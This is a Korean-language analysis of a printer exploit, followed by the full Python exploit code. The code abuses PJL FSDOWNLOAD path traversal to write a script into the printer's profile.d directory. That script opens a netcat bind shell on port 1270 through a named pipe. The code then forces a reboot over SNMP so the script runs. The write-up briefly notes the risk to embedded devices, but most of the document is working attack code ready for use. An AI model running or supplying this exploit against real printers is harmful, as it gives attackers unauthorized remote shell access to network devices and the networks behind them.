# 프린터 익스플로잇 코드 분석

이 코드는 특정 IP와 포트로 연결하여 프린터의 취약점을 악용하는 익스플로잇 코드입니다. 
프린터의 파일 시스템에 악성 쉘 스크립트를 업로드하고, 
SNMP를 통해 프린터를 재부팅시켜 해당 스크립트를 실행하도록 하는 것이 주요 목적입니다.

## 코드 분석

1. 필요한 라이브러리들을 임포트합니다 (socket, sys, easysnmp의 snmp_set)

2. `profile_d_script` 변수에 악성 쉘 스크립트 내용을 저장합니다. 
  - 이 스크립트는 `/tmp/pwned`라는 named pipe를 만들고, 이를 통해 들어오는 입력을 `/bin/sh`로 실행하며, 
  - 그 출력을 다시 named pipe로 보내는 한편, 1270 포트로 `nc`를 실행하여 원격에서 쉘에 접근할 수 있게 합니다.

3. 명령행 인자가 2개가 아니면 사용법을 출력하고 종료합니다.

4. 첫번째 명령행 인자를 IP로, 두번째 인자를 포트로 하여 서버 주소를 지정합니다. 이 주소로 소켓 연결을 생성합니다.

5. `dir_query` 변수에 프린터 파일 시스템에 파일을 쓰기 위한 PJL(Printer Job Language) 명령을 저장합니다. 
  - `FSDOWNLOAD` 명령을 사용하여 `profile_d_script`의 내용을 `"0:/../../rw/var/etc/profile.d/lol.sh"`에 씁니다.
  - 이는 프린터의 파일 시스템을 탐색하여 `profile.d` 디렉토리에 악성 스크립트를 업로드하는 것입니다.

6. 소켓을 통해 `dir_query`를 전송하고 연결을 닫습니다. 

7. 새로운 소켓 연결을 생성하고, `FSQUERY` 명령을 사용하여 업로드한 파일의 내용을 읽어옵니다. 응답을 출력합니다.

8. `easysnmp` 라이브러리의 `snmp_set` 함수를 사용하여 프린터의 SNMP OID `.1.3.6.1.2.1.43.5.1.1.3.1`의 값을 4로 설정합니다. 
  - 이는 프린터를 재부팅하도록 하는 명령입니다.

9. 완료 메시지를 출력하고, 약 30초 후에 1270 포트에 접속해보라고 안내합니다.
  - 프린터가 재부팅되면서 `profile.d`의 스크립트가 실행될 것이고, 1270 포트로 쉘에 접근할 수 있게 됩니다.

## 위험성

이 코드는 프린터의 취약한 설정을 악용하여 악성 코드를 심고 원격에서 실행하도록 하는 위험한 익스플로잇입니다. 
프린터 등의 임베디드 시스템도 보안에 각별한 주의를 기울여야 함을 보여주는 사례입니다.
특정 프린터 모델의 펌웨어 취약점을 악용한 것으로 보이며, 패치되지 않은 구형 장비들이 노출될 위험이 있어 보입니다.


```
import socket
import sys
from easysnmp import snmp_set

profile_d_script = ('if [ ! -p /tmp/pwned ]; then\n'
                    '\tmkfifo /tmp/pwned\n'
                    '\tcat /tmp/pwned | /bin/sh 2>&1 | /usr/bin/nc -l 1270 > /tmp/pwned &\n'
                    'fi\n')

if len(sys.argv) != 3:
    print('\nUsage: upload.py [ip] [port]\n')
    sys.exit()

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.settimeout(2)
server_address = (sys.argv[1], int(sys.argv[2]))
print('connecting to %s port %s' % server_address)
sock.connect(server_address)

dir_query = '@PJL FSDOWNLOAD FORMAT:BINARY SIZE=' + str(len(profile_d_script)) + ' NAME="0:/../../rw/var/etc/profile.d/lol.sh"\r\n'
dir_query += profile_d_script
dir_query += '\x1b%-12345X'
sock.sendall(dir_query)
sock.close()

sock1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock1.connect(server_address)
dir_query = '@PJL FSQUERY NAME="0:/../../rw/var/etc/profile.d/lol.sh"\r\n'
sock1.sendall(dir_query)

response = ''
while True:
    data = sock1.recv(1).decode()
    if '\n' == data:
        break
    response += data

print(response)
snmp_set('.1.3.6.1.2.1.43.5.1.1.3.1', 4, 'integer', hostname='192.168.1.158', community='public', version=1)
print('Done! Try port 1270 in ~30 seconds')

```
